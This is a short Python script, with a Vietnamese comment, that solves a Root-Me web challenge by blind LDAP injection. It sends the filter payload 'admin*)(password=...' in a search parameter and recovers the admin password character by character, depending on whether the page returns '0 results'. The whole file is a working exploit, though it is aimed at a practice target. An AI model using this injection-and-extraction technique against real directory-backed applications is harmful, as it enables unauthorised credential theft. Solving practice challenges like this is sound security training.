import requests
import string

char = ''
# nên tự lấy letter, digits rồi ms ký tự, tiết kiệm thời gian brute-force
char = string.ascii_letters + string.digits + '!@#$%-_=+ ,.?}{[]'

url = 'http://challenge01.root-me.org/web-serveur/ch26/'

flag = ''
for i in range(30):
	print('[+]FIND at %i:' %(i))
	for c in char:
		payload = "admin*)(password=%s" %(flag + c)
		params = {'action':'dir','search':payload}
		r = requests.get(url, params=params)
		if '0 results' not in r.text:
			flag += c
			print("[+]FOUND: " + flag)
			break